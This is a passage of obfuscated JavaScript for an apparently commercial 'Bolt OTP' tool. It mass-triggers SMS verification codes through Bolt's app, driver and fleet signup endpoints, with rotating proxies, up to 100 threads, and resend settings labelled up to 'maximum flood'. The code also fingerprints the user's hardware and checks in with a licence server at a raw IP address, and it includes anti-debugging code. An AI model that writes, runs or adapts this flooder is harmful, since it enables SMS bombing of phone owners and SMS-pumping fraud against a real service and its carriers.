        }]);
        if (_0x2700bf === "remove") {
          fs.unlinkSync(NEXA_KEY_FILE);
          _0x2abf0d = "";
        } else if (_0x2700bf === "new") {
          _0x2abf0d = "";
        }
      }
      if (!_0x2abf0d) {
        _0x2abf0d = await promptText("Enter NexaOTP API Key:", "");
        const _0x45376e = await selectOption("Save key for future use?", [{
          name: "Yes, save it",
          value: "yes"
        }, {
          name: "No",
          value: "no"
        }]);
        if (_0x45376e === "yes") {
          fs.writeFileSync(NEXA_KEY_FILE, _0x2abf0d, "utf8");
        }
      }
      let _0xb505ad = [];
      let _0x540ebd = true;
      while (_0x540ebd) {
        const _0x480c59 = await promptText("Enter range #" + (_0xb505ad.length + 1) + " (e.g. 88017XXXXXXX):", "");
        if (_0x480c59) {
          _0xb505ad.push(_0x480c59);
        }
        const _0x1ae60a = await selectOption("Add another range?", [{
          name: "Yes",
          value: "yes"
        }, {
          name: "No, proceed",
          value: "no"
        }]);
        if (_0x1ae60a === "no") {
          _0x540ebd = false;
        }
      }
      if (_0xb505ad.length === 0) {
        console.log(R("\n   ✗ No ranges provided.\n"));
        process.exit(1);
      }
      const _0x5787e2 = await promptText("How many numbers to process?:", "50");
      const _0x39180c = parseInt(_0x5787e2) || 50;
      const _0x21c264 = await selectOption("SELECT NEXA SERVER", [{
        name: "Server 1 (/get)",
        value: "/api/v1/numbers/get"
      }, {
        name: "Server 2 (/p2/get)",
        value: "/api/v1/numbers/p2/get"
      }, {
        name: "Server 3 (/p3/get)",
        value: "/api/v1/numbers/p3/get"
      }]);
      const _0x846ed4 = {
        apiKey: _0x2abf0d,
        ranges: _0xb505ad,
        totalCount: _0x39180c,
        serverEndpoint: _0x21c264
      };
      _0x45b021 = _0x846ed4;
    } else {
      _0xaac770 = await promptText("Enter Numbers File Path [numbers.txt]:", "numbers.txt");
      if (!fs.existsSync(_0xaac770)) {
        fs.writeFileSync(_0xaac770, "");
      }
    }
    let _0x5366d0 = await promptText("Enter Proxies File Path (blank = direct):", "none");
    if (_0x5366d0 === "none" || _0x5366d0 === "") {
      _0x5366d0 = "";
    }
    let _0xa64162 = await selectOption("SELECT THREADS", [{
      name: "10 Threads",
      value: 10
    }, {
      name: "20 Threads (Default)",
      value: 20
    }, {
      name: "50 Threads (Fast)",
      value: 50
    }, {
      name: "100 Threads (Extreme)",
      value: 100
    }, {
      name: "Custom",
      value: "custom"
    }]);
    if (_0xa64162 === "custom") {
      const _0x290bac = await promptText("Enter custom thread count:", "20");
      _0xa64162 = parseInt(_0x290bac) || 20;
    }
    const _0x4d85cc = await selectOption("SELECT API MODE", [{
      name: "Bolt App         — Android OTP (phone verification)",
      value: "app"
    }, {
      name: "Bolt Driver      — Driver registration portal (web)",
      value: "driver"
    }, {
      name: "Bolt Fleet Owner — Fleet signup portal (web)",
      value: "fleet"
    }, {
      name: "MIXED            — Rotate all 3 APIs per number",
      value: "mixed"
    }]);
    const _0x463c32 = await selectOption("RESEND COUNT — how many OTPs per number?", [{
      name: "1  — Send once (no resend)",
      value: 1
    }, {
      name: "2  — Send twice",
      value: 2
    }, {
      name: "3  — Send 3x (flood light)",
      value: 3
    }, {
      name: "5  — Send 5x (aggressive)",
      value: 5
    }, {
      name: "10 — Send 10x (maximum flood)",
      value: 10
    }, {
      name: "Custom — enter your own count",
      value: "custom"
    }]);
    let _0x29a049 = _0x463c32;
    if (_0x463c32 === "custom") {
      const _0x40361f = await promptText("Enter resend count per number (e.g. 4):", "1");
      _0x29a049 = Math.max(1, parseInt(_0x40361f) || 1);
    }
    process.stdin.pause();
    return {
      numbersFile: _0xaac770,
      threads: String(_0xa64162),
      proxiesFile: _0x5366d0,
      nexaConfig: _0x45b021,
      apiMode: _0x4d85cc,
      resendCount: _0x29a049
    };
  }
  function generateHWID() {
    const _0x29dfcf = require("os");
    const _0x171526 = _0x29dfcf.platform();
    try {
      if (_0x171526 === "win32") {
        const _0x2386f8 = execSync("powershell -NoProfile -Command \"$mg = (Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Cryptography' -ErrorAction SilentlyContinue).MachineGuid; $cpu = (Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1).ProcessorId; $disk = (Get-CimInstance Win32_LogicalDisk -Filter 'DeviceID=\\'C:\\'' -ErrorAction SilentlyContinue).VolumeSerialNumber; $mb = (Get-CimInstance Win32_BaseBoard -ErrorAction SilentlyContinue).SerialNumber; Write-Output (($mg,$cpu,$disk,$mb) -join '|')\"", {
          stdio: "pipe",
          timeout: 15000
        }).toString().trim();
        if (!_0x2386f8) {
          throw new Error("No hardware data");
        }
        const _0x2e8244 = crypto.createHash("sha256").update(_0x2386f8).digest("hex").toUpperCase();
        return "SKING-" + _0x2e8244.substring(0, 8) + "-" + _0x2e8244.substring(8, 12) + "-" + _0x2e8244.substring(12, 16);
      } else {
        let _0x29aa2f = [];
        try {
          const _0x435b07 = execSync("settings get secure android_id 2>/dev/null || echo \"\"", {
            stdio: "pipe",
            timeout: 5000
          }).toString().trim();
          if (_0x435b07 && _0x435b07 !== "null") {
            _0x29aa2f.push("A:" + _0x435b07);
          }
        } catch (_0x1192c6) {}
        try {
          {
            if (fs.existsSync("/proc/cpuinfo")) {
              const _0x1a5852 = fs.readFileSync("/proc/cpuinfo", "utf8");
              const _0x417184 = _0x1a5852.match(/Serial\s*:\s*(\S+)/i);
              const _0x2d1808 = _0x1a5852.match(/Hardware\s*:\s*(.+)/i);
              if (_0x417184 && _0x417184[1] !== "0000000000000000") {
                _0x29aa2f.push("S:" + _0x417184[1].trim());
              }
              if (_0x2d1808) {
                _0x29aa2f.push("H:" + _0x2d1808[1].trim());
              }
            }
          }
        } catch (_0x6c8477) {}
        try {
          if (fs.existsSync("/etc/machine-id")) {
            const _0x5e8aab = fs.readFileSync("/etc/machine-id", "utf8").trim();
            if (_0x5e8aab) {
              _0x29aa2f.push("M:" + _0x5e8aab);
            }
          }
        } catch (_0x1cc7da) {}
        try {
          const _0x34e07e = _0x29dfcf.cpus();
          const _0x25ec10 = _0x34e07e && _0x34e07e.length > 0 ? _0x34e07e[0].model : "UnknownCPU";
          const _0x3fea8d = _0x29dfcf.totalmem();
          const _0x2c7b6f = _0x29dfcf.release();
          const _0x3a867c = _0x29dfcf.hostname();
          _0x29aa2f.push("F:" + _0x25ec10 + "|" + _0x3fea8d + "|" + _0x2c7b6f + "|" + _0x3a867c);
        } catch (_0x564bbd) {}
        const _0x43d00c = _0x29aa2f.join("||");
        const _0x508a5e = crypto.createHash("sha256").update(_0x43d00c).digest("hex").toUpperCase();
        return "ANKING-" + _0x508a5e.substring(0, 8) + "-" + _0x508a5e.substring(8, 12) + "-" + _0x508a5e.substring(12, 16);
      }
    } catch (_0x359cff) {
      return "";
    }
  }
  function verifyServerSignature(_0x125e27, _0x1bece9) {
    if (!_0x1bece9) {
      return false;
    }
    const _0x3308a9 = "-----BEGIN PUBLIC KEY-----\nMCowBQYDK2VwAyEAIU7Pc75ao+Fn7XGC7kFGeDh7JAs3o4NSL2LgmN0YmfY=\n-----END PUBLIC KEY-----";
    try {
      return crypto.verify(null, Buffer.from(_0x125e27, "utf8"), _0x3308a9, Buffer.from(_0x1bece9, "base64"));
    } catch (_0x102b10) {
      return false;
    }
  }
  async function start() {
    const _0x205749 = process.argv.slice(2).filter(_0x185b77 => !_0x185b77.startsWith("--"));
    let _0x4404c7 = "";
    if (_0x205749[5] && _0x205749[5] !== "SKING-UI-HARDWARE-ID") {
      _0x4404c7 = _0x205749[5];
    }
    if (!_0x4404c7) {
      _0x4404c7 = generateHWID();
    }
    global.globalHwid = _0x4404c7;
    if (!_0x4404c7) {
      console.error(R("\n  ✗ Could not generate Hardware ID. Run on Windows or Android.\n"));
      process.exit(1);
    }
    if (!_0x205749[5] || _0x205749[5] === "SKING-UI-HARDWARE-ID") {
      const _0x20b360 = generateHWID();
      if (_0x20b360 !== _0x4404c7) {
        console.error(R("\n  ✗ HWID integrity check failed. Tampering detected.\n"));
        process.exit(1);
      }
    }
    let _0x3c686d = false;
    const _0x1179ab = Date.now();
    let _0x2b46c9;
    try {
      const _0x5afb38 = "188.137.176.163";
      const _0x26807e = await new Promise((_0x5e7603, _0x443d71) => {
        {
          const _0x25434a = {
            hwid: _0x4404c7,
            app_id: "bolt",
            version: "1.0.0",
            timestamp: _0x1179ab
          };
          const _0x49fa52 = JSON.stringify(_0x25434a);
          const _0x21b0d5 = {
            hostname: _0x5afb38,
            port: 3777,
            path: "/api/verify",
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              "Content-Length": Buffer.byteLength(_0x49fa52)
            },
            timeout: 10000
          };
          const _0x364dce = http.request(_0x21b0d5, _0x1f91ce => {
            let _0x41a940 = "";
            _0x1f91ce.on("data", _0x373d86 => _0x41a940 += _0x373d86);
            _0x1f91ce.on("end", () => {
              try {
                _0x5e7603(JSON.parse(_0x41a940));
              } catch (_0x5251ef) {
                _0x443d71(_0x5251ef);
              }
            });
          });
          _0x364dce.on("error", _0x443d71);
          _0x364dce.on("timeout", function () {
            this.destroy();
            _0x443d71(new Error("Timeout"));
          });
          _0x364dce.write(_0x49fa52);
          _0x364dce.end();
        }
      });
      if (_0x26807e) {
        if (_0x26807e.status === "update_required") {
          console.error(R("\n  ✗ Update required! Please download the latest version.\n"));
          process.exit(1);
        }
        if (_0x26807e.status === "banned" || _0x26807e.status === "expired" || !_0x26807e.sig) {
          await new Promise(_0x5beb6b => setTimeout(_0x5beb6b, 2000));
          let _0x2c663b = String(_0x26807e.reason || "NOT REGISTERED");
          if (!_0x26807e.reason && !_0x26807e.sig) {
            _0x2c663b = "NOT REGISTERED / REMOVED";
          }
          console.error(R("\n  ╔══════════════════════════════════════════════╗"));
          console.error(R("  ║    ✗ UNAUTHORIZED HARDWARE — BOLT TOOL      ║"));
          console.error(R("  ╠══════════════════════════════════════════════╣"));
          console.error(R("  ║  HWID   : ") + Y(_0x4404c7.padEnd(33)) + R("║"));
          console.error(R("  ║  Status : " + _0x2c663b.padEnd(26) + "║"));
          console.error(R("  ║  Contact: t.me/Rex_OTP_Tool to register     ║"));
          console.error(R("  ╚══════════════════════════════════════════════╝\n"));
          process.exit(1);
        }
        const _0x17a18a = _0x4404c7 + "|bolt|1.0.0|" + _0x1179ab;
        if (!verifyServerSignature(_0x17a18a, _0x26807e.sig)) {
          console.error(R("\n  ✗ Internal Server Error (500). Please try again later.\n"));
          process.exit(1);
        }
        _0x3c686d = true;
        let _0x1f6ac3 = _0x26807e.token;
        if (!_0x1f6ac3) {
          console.error(R("\n  ✗ Invalid Server Response: Missing Active Session Token. Aborting.\n"));
          process.exit(1);
        }
        _0x2b46c9 = setInterval(() => {
          {
            if (!_0x1f6ac3) {
              console.error(R("\n  ✗ Session Token lost. Aborting...\n"));
              process.exit(1);
            }
            const _0x406241 = {
              hwid: _0x4404c7,
              app_id: "bolt",
              token: _0x1f6ac3
            };
            const _0x351131 = JSON.stringify(_0x406241);
            const _0x24d5bf = {
              hostname: _0x5afb38,
              port: 3777,
              path: "/api/ping",
              method: "POST",
              headers: {
                "Content-Type": "application/json",
                "Content-Length": Buffer.byteLength(_0x351131)
              },
              timeout: 15000
            };
            const _0x514729 = http.request(_0x24d5bf, _0xe767f2 => {
              let _0x496ebc = "";
              _0xe767f2.on("data", _0x43e778 => _0x496ebc += _0x43e778);
              _0xe767f2.on("end", () => {
                try {
                  const _0x17d68c = JSON.parse(_0x496ebc);
                  if (_0x17d68c.status === "ok" && _0x17d68c.token) {
                    _0x1f6ac3 = _0x17d68c.token;
                  } else {
                    console.error(R("\n  ✗ Session invalidated by server (kill). Exiting...\n"));
                    process.exit(1);
                  }
                } catch (_0x432c39) {
                  console.error(R("\n  ✗ Network error during session ping. Exiting...\n"));
                  process.exit(1);
                }
              });
            });
            _0x514729.on("error", () => {
              console.error(R("\n  ✗ Disconnected from License Server. Exiting...\n"));
              process.exit(1);
            });
            _0x514729.on("timeout", function () {
              this.destroy();
              console.error(R("\n  ✗ License Server timeout. Exiting...\n"));
              process.exit(1);
            });
            _0x514729.write(_0x351131);
            _0x514729.end();
          }
        }, 45000);
        if (_0x2b46c9 && _0x2b46c9.unref) {
          _0x2b46c9.unref();
        }
      }
    } catch (_0x28a3ba) {
      console.error(R("\n  ✗ License server is currently undergoing maintenance or is unreachable."));
      console.error(R("    Please check your internet connection or try again later.\n"));
      process.exit(1);
    }
    if (!_0x3c686d) {
      console.error(R("\n  ✗ License verification failed. Exiting.\n"));
      process.exit(1);
    }
    let _0x4b451c = null;
    if (_0x205749.length === 0) {
      _0x4b451c = await interactiveWizard();
    }
    let _0x1cb8c9;
    let _0x3259f2;
    let _0x519713;
    let _0x3b51e9;
    let _0x5eeb71;
    let _0x404dbc;
    if (_0x4b451c && typeof _0x4b451c === "object" && !Array.isArray(_0x4b451c)) {
      const _0x52e276 = "1|2|0|5|3|4".split("|");
      {
        _0x1cb8c9 = path.resolve(_0x4b451c.numbersFile || "numbers.txt");
        _0x3259f2 = parseInt(_0x4b451c.threads) || 20;
        _0x519713 = _0x4b451c.proxiesFile || "";
        _0x3b51e9 = _0x4b451c.nexaConfig || null;
        _0x5eeb71 = _0x4b451c.apiMode || "app";
        _0x404dbc = Math.max(1, parseInt(_0x4b451c.resendCount) || 1);
      }
    } else {
      const _0x21591d = "0|4|2|3|5|1".split("|");
      {
        _0x1cb8c9 = path.resolve(_0x205749[0] || "numbers.txt");
        _0x3259f2 = parseInt(_0x205749[1]) || 20;
        _0x519713 = _0x205749[2] || "";
        _0x5eeb71 = _0x205749[3] || "app";
        _0x404dbc = parseInt(_0x205749[4]) || 1;
        _0x3b51e9 = null;
      }
    }
    if (_0x519713.toLowerCase() === "none" || _0x519713 === "false") {
      _0x519713 = "";
    }
    printHeader();
    let _0x53ad5b = [];
    let _0x241d9b = [];
    let _0x16d3ff = false;
    let _0x64be5c = [];
    if (_0x3b51e9) {
      console.log(Y("\n  [NexaOTP] Streaming " + _0x3b51e9.totalCount + " numbers (" + _0x3b51e9.ranges.length + " range(s))..."));
      (async () => {
        {
          for (let _0x2a89cd = 0; _0x2a89cd < _0x3b51e9.totalCount; _0x2a89cd++) {
            try {
              const _0x3f153c = _0x3b51e9.ranges[Math.floor(Math.random() * _0x3b51e9.ranges.length)];
              const _0x21cd2e = await nexaLimiter.enqueue(() => nexaFetchNumber(_0x3b51e9.apiKey, _0x3f153c, _0x3b51e9.serverEndpoint));
              if (_0x21cd2e) {
                if (_0x64be5c.length > 0) {
                  _0x64be5c.shift()(_0x21cd2e);
                } else {
                  _0x241d9b.push(_0x21cd2e);
                }
              }
            } catch (_0x3aed94) {}
          }
          _0x16d3ff = true;
          for (const _0xa18676 of _0x64be5c) {
            _0xa18676(null);
          }
          _0x64be5c = [];
        }
      })();
    } else {
      if (!fs.existsSync(_0x1cb8c9)) {
        console.error(R("\nNumbers file not found: " + _0x1cb8c9));
        process.exit(1);
      }
      _0x53ad5b = fs.readFileSync(_0x1cb8c9, "utf8").split(/\r?\n/).map(_0x130d4b => _0x130d4b.trim()).filter(_0x44de52 => _0x44de52 && _0x44de52.replace(/\D/g, "").length >= 7);
      if (_0x53ad5b.length === 0) {
        console.error(R("\nNo valid phone numbers in file"));
        process.exit(1);
      }
    }
    let _0x3d817e = [];
    if (_0x519713 && fs.existsSync(_0x519713)) {
      _0x3d817e = fs.readFileSync(_0x519713, "utf8").split("\n").map(_0x43743a => _0x43743a.trim()).filter(Boolean);
    }
    const _0x539020 = _0x3d817e.map(parseProxy).filter(Boolean);
    const _0x1801ee = {
      app: "Bolt App",
      driver: "Bolt Driver",
      fleet: "Bolt Fleet",
      mixed: "MIXED (3 APIs: App+Driver+Fleet)"
    };
    if (_0x3b51e9) {
      console.log(Y("  Mode: NexaOTP Streaming (" + _0x3b51e9.totalCount + " numbers)"));
    } else {
      console.log(Y("  Loaded: " + _0x53ad5b.length + " targets"));
    }
    console.log(B("  API     : " + (_0x1801ee[_0x5eeb71] || _0x5eeb71)));
    console.log(B("  Resend  : " + _0x404dbc + "x per number"));
    console.log(B("  Method  : SMS ONLY"));
    console.log(_0x539020.length ? G("  Proxies : " + _0x539020.length + " loaded") : G("  Proxies : DIRECT"));
    console.log(C("  Threads : " + _0x3259f2 + "\n"));
    fs.writeFileSync(SUCCESSFUL_FILE, "");
    fs.writeFileSync(FAILED_FILE, "");
    fs.writeFileSync(DEBUG_FILE, "=== BOLT OTP DEBUG SESSION ===\n");
    const _0x3b2478 = _0x3b51e9 ? _0x3b51e9.totalCount : _0x53ad5b.length;
    const _0x18cb74 = new Dashboard(_0x3b2478);
    const _0x239db4 = _0x3b51e9 ? async () => {
      {
        if (_0x241d9b.length > 0) {
          return _0x241d9b.shift();
        }
        if (_0x16d3ff) {
          return null;
        }
        return new Promise(_0x456888 => _0x64be5c.push(_0x456888));
      }
    } : async () => {
      {
        if (_0x53ad5b.length === 0) {
          return null;
        }
        return _0x53ad5b.splice(Math.floor(Math.random() * _0x53ad5b.length), 1)[0];
      }
    };
    let _0x27e92f = 0;
    const _0x25b1ea = () => {
      {
        if (_0x539020.length === 0) {
          return null;
        }
        return rotateSessionId(_0x539020[_0x27e92f++ % _0x539020.length]);
      }
    };
    function _0xfcb36c(_0x49e806) {
      try {
        {
          if (_0x3b51e9) {
            return;
          }
          const _0x1faf85 = fs.readFileSync(_0x1cb8c9, "utf8").split(/\r?\n/).filter(_0x454861 => _0x454861.trim() !== _0x49e806.trim()).join("\n");
          fs.writeFileSync(_0x1cb8c9, _0x1faf85);
        }
      } catch (_0x3a0dc6) {}
    }
    const _0x2256b2 = _0x3b51e9 ? Math.min(_0x3259f2, _0x3b51e9.totalCount) : Math.min(_0x3259f2, _0x53ad5b.length);
    const _0x194f70 = [];
    const _0x4c28d3 = setInterval(() => _0x18cb74.render(), 500);
    const _0x1c29a0 = _0x4b24fd => new Promise(_0x3fbf26 => setTimeout(_0x3fbf26, _0x4b24fd));
    async function _0x986337(_0x413d1b) {
      while (true) {
        {
          const _0x274a56 = await _0x239db4();
          if (!_0x274a56) {
            break;
          }
          let _0x170242 = false;
          for (let _0x21e6a7 = 1; _0x21e6a7 <= _0x404dbc; _0x21e6a7++) {
            {
              try {
                {
                  const _0x319ac5 = _0x404dbc > 1 ? " [" + _0x21e6a7 + "/" + _0x404dbc + "]" : "";
                  const _0x5d7cfc = await triggerOtpAuto(_0x274a56, {
                    onStatus: _0x59aec7 => _0x18cb74.setStatus("Worker " + _0x413d1b + _0x319ac5 + ": " + _0x59aec7),
                    proxy: _0x25b1ea(),
                    timeout: 20000,
                    apiMode: _0x5eeb71
                  });
                  if (_0x5d7cfc.success) {
                    _0x170242 = true;
                    const _0x4f54c1 = _0x5d7cfc.channel || "sms";
                    const _0x383385 = _0x5d7cfc.api || _0x5eeb71.toUpperCase();
                    fs.appendFileSync(SUCCESSFUL_FILE, _0x5d7cfc.phone + "|OTP_SENT|" + _0x383385 + "|" + _0x4f54c1.toUpperCase() + "|ROUND_" + _0x21e6a7 + "\n");
                    _0x18cb74.addLog("OK" + _0x319ac5 + ": " + _0x5d7cfc.phone + " [" + _0x383385 + "/" + _0x4f54c1.toUpperCase() + "]", "success");
                  } else {
                    fs.appendFileSync(FAILED_FILE, _0x5d7cfc.phone + "|" + _0x5d7cfc.message + "|ROUND_" + _0x21e6a7 + "\n");
                    _0x18cb74.addLog("FAIL" + _0x319ac5 + ": " + _0x5d7cfc.phone + " > " + _0x5d7cfc.message, "error");
                  }
                }
              } catch (_0x32dc11) {
                _0x18cb74.addLog("ERR" + (_0x404dbc > 1 ? " [" + _0x21e6a7 + "/" + _0x404dbc + "]" : "") + ": " + _0x274a56 + " > " + _0x32dc11.message, "error");
              }
              if (_0x21e6a7 === 1) {
                if (_0x170242) {
                  _0x18cb74.successful++;
                  _0x18cb74.processed++;
                  _0xfcb36c(_0x274a56);
                } else {
                  _0x18cb74.failed++;
                  _0x18cb74.processed++;
                }
              }
              if (_0x21e6a7 < _0x404dbc) {
                await _0x1c29a0(Math.floor(Math.random() * 700) + 800);
              }
            }
          }
          await _0x1c29a0(Math.floor(Math.random() * 2000) + 1500);
        }
      }
    }
    for (let _0x12a625 = 0; _0x12a625 < _0x2256b2; _0x12a625++) {
      _0x194f70.push(_0x986337(_0x12a625));
    }
    await Promise.all(_0x194f70);
    clearInterval(_0x4c28d3);
    if (typeof global !== "undefined" && global.globalPingInterval) {
      clearInterval(global.globalPingInterval);
    }
    _0x18cb74.render();
    _0x18cb74.stop();
  }
  start();
}
function fn2(_0x4a084f) {
  function _0x513246(_0x2fcf74) {
    {
      _0x513246(++_0x2fcf74);
    }
  }
  try {
    if (_0x4a084f) {
      return _0x513246;
    } else {
      _0x513246(0);
    }
  } catch (_0xf7424f) {}
}